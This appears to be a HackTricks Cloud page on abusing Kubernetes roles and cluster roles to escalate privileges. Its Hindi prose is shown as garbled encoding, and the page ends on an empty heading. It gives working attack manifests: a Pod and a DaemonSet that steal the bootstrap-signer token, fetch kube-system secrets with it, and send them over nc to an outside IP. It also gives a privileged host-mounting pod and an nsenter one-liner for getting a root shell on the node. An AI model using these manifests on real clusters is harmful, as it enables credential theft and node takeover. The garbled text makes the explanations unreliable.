# рдХреБрдмрд░рдиреЗрдЯреАрдЬ рдореЗрдВ рднреВрдорд┐рдХрд╛/рдХреНрд▓рд╕реНрдЯрд░ рднреВрдорд┐рдХрд╛рдПрдВ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

рдпрд╣рд╛рдБ рдЖрдк рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдЦрддрд░рдирд╛рдХ рднреВрдорд┐рдХрд╛ рдФрд░ рдХреНрд▓рд╕реНрдЯрд░ рднреВрдорд┐рдХрд╛рдПрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдЖрдк `kubectl api-resources` рдХреЗ рд╕рд╛рде рд╕рднреА рд╕рдорд░реНрдерд┐рдд рд╕рдВрд╕рд╛рдзрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди**

рдХреБрдмрд░рдиреЗрдЯреАрдЬ рдореЗрдВ **рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХрд▓рд╛** рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд рд╣реЛрдирд╛ **рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рддрдХ рдкрд╣реБрдВрдЪ** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА (рдХреБрдмрд░рдиреЗрдЯреАрдЬ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ рдпрд╛ рдмрд╛рд╣рд░реА рдмрд╛рджрд▓реЛрдВ рддрдХ) рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╕реЗ **рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ**, рдХреБрдмрд░рдиреЗрдЯреАрдЬ рдореЗрдВ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **4 рдореБрдЦреНрдп рддрдХрдиреАрдХ рд╣реИрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди**:

* рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдореВрд╣/SAs рдХрд╛ **рдЕрдиреБрдХрд░рдг** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ рдХреБрдмрд░рдиреЗрдЯреАрдЬ рдХреНрд▓рд╕реНрдЯрд░ рдпрд╛ рдмрд╛рд╣рд░реА рдмрд╛рджрд▓реЛрдВ рдореЗрдВ рдмреЗрд╣рддрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ
* рдкреЙрдб рдмрдирд╛рдиреЗ/рдкреИрдЪ/рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЬрд╣рд╛рдВ рдЖрдк **рдмреЗрд╣рддрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ SAs** рдХреЛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреБрдмрд░рдиреЗрдЯреАрдЬ рдХреНрд▓рд╕реНрдЯрд░ рдпрд╛ рдмрд╛рд╣рд░реА рдмрд╛рджрд▓реЛрдВ рдореЗрдВ
* рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдкрдврд╝рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдХреНрдпреЛрдВрдХрд┐ SAs рдЯреЛрдХрди рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ
* рдиреЛрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛, рдЬрд╣рд╛рдВ рдЖрдк рдиреЛрдб рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдХреЙрдиреНрдЯреЗрдирд░реЛрдВ рдХреЗ рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕, рдиреЛрдб рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕, рдФрд░ рдиреЛрдб рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рд╡рд╣ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ (рдпрджрд┐ рдХреЛрдИ рд╣реЛ)
* рдПрдХ рдкрд╛рдВрдЪрд╡реАрдВ рддрдХрдиреАрдХ рдЬрд┐рд╕реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд░рдиреЗ рдХрд╛ рдореМрдХрд╛ рд╣реИ, рд╡рд╣ рд╣реИ **рдкреЙрдб рдореЗрдВ рдкреЛрд░реНрдЯ-рдлреЙрд░рд╡рд░реНрдб** рдЪрд▓рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдЙрд╕ рдкреЙрдб рдХреЗ рднреАрддрд░ рджрд┐рд▓рдЪрд╕реНрдк рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

### рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдпрд╛ рдХреНрд░рд┐рдпрд╛ рддрдХ рдкрд╣реБрдВрдЪреЗрдВ (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб)

**рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб (\*) рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдкрд░ рдХрд┐рд╕реА рднреА рдХреНрд░рд┐рдпрд╛ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред рдпрд╣ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдХреНрд▓рд╕реНрдЯрд░ рднреВрдорд┐рдХрд╛ рдХреЗ рднреАрддрд░ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдХрд┐рд╕реА рднреА рдиреЗрдорд╕реНрдкреЗрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдВрдЪреЗрдВ

RBAC рдореЗрдВ, рдХреБрдЫ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬреЛрдЦрд┐рдо рд▓реЗрдХрд░ рдЖрддреА рд╣реИрдВ:

1. **`create`:** рдХрд┐рд╕реА рднреА рдХреНрд▓рд╕реНрдЯрд░ рд╕рдВрд╕рд╛рдзрди рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐ рдХрд╛ рдЦрддрд░рд╛ рд╣реЛрддрд╛ рд╣реИред
2. **`list`:** рд╕рднреА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд▓реАрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
3. **`get`:** рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рд╕реЗ рд░рд╣рд╕реНрдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЦрддрд░рд╛ рдкреИрджрд╛ рдХрд░рддреА рд╣реИред
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### рдкреЙрдб рдмрдирд╛рдПрдВ - рдЯреЛрдХрди рдЪреБрд░рд╛рдПрдВ

рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╣реИ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдкреЙрдб рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдкреЙрдб рдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХреЗред рдЗрд╕реЗ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдЙрд╕рдХреА рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрд╣реЗрдВ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдПред

`bootstrap-signer` рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХрд╛ рдЯреЛрдХрди рдЪреБрд░рд╛рдПрдВ рдФрд░ рдЙрд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рднреЗрдЬреЗрдВ, рдЗрд╕рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### рдкреЙрдб рдмрдирд╛рдПрдВ рдФрд░ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдВ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рднреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЛ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ:

* **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкрд╣реБрдВрдЪ** (рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рдФрд░ рдХреНрд╖рдорддрд╛рдПрдБ рд╕реЗрдЯ рдХрд░рдирд╛)
* **рдирд╛рдорд╕реНрдерд╛рди hostIPC рдФрд░ hostPid рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ** рдЬреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* **hostNetwork рдХрд╛ рдирд╛рдорд╕реНрдерд╛рди рдЕрдХреНрд╖рдо рдХрд░реЗрдВ**, рдЬрд┐рд╕рд╕реЗ рдиреЛрдбреНрд╕ рдХреНрд▓рд╛рдЙрдб рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЪреБрд░рд╛рдиреЗ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХреНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗ
* **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдорд╛рдЙрдВрдЯ рд╣реЛрд╕реНрдЯ / рдХрд░реЗрдВ**
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

рдкреЙрдб рдмрдирд╛рдПрдВ:
```bash
kubectl --token $token create -f mount_root.yaml
```
рдЗрд╕ [рдЯреНрд╡реАрдЯ](https://twitter.com/mauilion/status/1129468485480751104) рд╕реЗ рдПрдХ-рд▓рд╛рдЗрдирд░ рдФрд░ рдХреБрдЫ рдЬреЛрдбрд╝реЛрдВ рдХреЗ рд╕рд╛рде:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
рдЕрдм рдЬрдм рдЖрдк рдиреЛрдб рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди рддрдХрдиреАрдХреЛрдВ рдореЗрдВ рднрд╛рдЧ рд▓реЗ рд╕рдХрддреЗ рд╣реИрдВ:

#### рдЫрд▓

рдЖрдк рд╢рд╛рдпрдж **рдЫрд▓рд╛рдВрдЧ** рд▓реЗрдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрдареЛрдВ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдХрд┐рд╕реЗ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЖрдк рдПрдХ рдкреЙрдб рдмрдирд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдкрд┐рдЫрд▓реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдореЗрдВ рд╕реЗ рдХреБрдЫ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ:

* **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд + hostPID**
* **рдХреЗрд╡рд▓ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_рдЖрдк рдпрд╣рд╛рдВ рдкрд┐рдЫрд▓реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдкреЙрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдмрдирд╛рдиреЗ/рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### рдкреЙрдб рдмрдирд╛рдПрдВ - рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдЬрд╛рдПрдВ

рдпрджрд┐ рдЖрдк рдПрдХ **рдкреЙрдб рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** (рдФрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ рдПрдХ **рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛**) рддреЛ рдЖрдк **рдХреНрд▓рд╛рдЙрдб рдкрд░рд┐рд╡реЗрд╢ рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдЖрдк **рдкреЙрдб рдпрд╛ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреЛ рдХреНрд▓рд╛рдЙрдб рднреВрдорд┐рдХрд╛рдУрдВ рд╕реМрдВрдкрддреЗ рд╣реИрдВ** рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред\
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдЖрдк **рд╣реЛрд╕реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд╕рд╛рде рдкреЙрдб рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк **рдиреЛрдб** рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА **IAM** рднреВрдорд┐рдХрд╛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ, рдбреЗрдордирд╕реЗрдЯ, рд╕реНрдЯреЗрдЯрдлреБрд▓рд╕реЗрдЯ, рд░рд┐рдкреНрд▓рд┐рдХреЗрд╢рдирдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕, рд░реЗрдкреНрд▓рд┐рдХрд╛рд╕реЗрдЯреНрд╕, рдЬреЙрдмреНрд╕ рдФрд░ рдХреНрд░реЙрдирдЬреЙрдмреНрд╕ рдмрдирд╛рдПрдВ/рдкреИрдЪ рдХрд░реЗрдВ**

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рдкреЙрдб рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдХреА рддрд░рд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд yaml **рдПрдХ рдбреЗрдордирд╕реЗрдЯ рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ SA рдХрд╛ рдЯреЛрдХрди рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ**:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **рдкреЙрдбреНрд╕ Exec**

**`pods/exec`** рдПрдХ рд╕рдВрд╕рд╛рдзрди рд╣реИ рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдореЗрдВ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рд╢реИрд▓ рдореЗрдВ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЬрд░рд┐рдП **рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЗ рдЕрдВрджрд░ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рдпрд╛ рд╢реИрд▓ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░рдиреЗ** рдХреА рд╕реБрд╡рд┐рдзрд╛ рд╣реЛрддреА рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдПрдХ рдкреЙрдб рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░рдХреЗ рдПрд╕рдП рдХрд╛ рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХрдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдпрд╛ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдкреЙрдб рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░рдХреЗ, рдиреЛрдб рдореЗрдВ рднрд╛рдЧрдиреЗ рдФрд░ рдиреЛрдб рдореЗрдВ рд╕реНрдерд┐рдд рдкреЙрдб рдХреЗ рд╕рднреА рдЯреЛрдХрди рдЪреБрд░рд╛ рд▓реЗрдиреЗ рдФрд░ рдиреЛрдб рдХрд╛ (рдЕрдкрд╢рд┐рд╖реНрдЯ) рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### рдкреЛрд░реНрдЯ-рдлреЙрд░рд╡рд░реНрдб

рдпрд╣ рдЕрдиреБрдорддрд┐ **рдПрдХ рд╕реНрдерд╛рдиреАрдп рдкреЛрд░реНрдЯ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкреЙрдб рдореЗрдВ рдПрдХ рдкреЛрд░реНрдЯ рдкрд░ рдлреЙрд░рд╡рд░реНрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ**ред рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдкреЛрдб рдХреЗ рдЕрдВрджрд░ рдЪрд▓ рд░рд╣реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдбреАрдмрдЧ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк (рдЬреИрд╕реЗ рдбреАрдмреАрдЬреА) рдпрд╛ рдХрдордЬреЛрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ (рд╡реЗрдмреНрд╕?) рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
kubectl port-forward pod/mypod 5000:5000
```
### рд╣реЛрд╕реНрдЯ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп /var/log/ рдПрд╕реНрдХреЗрдк

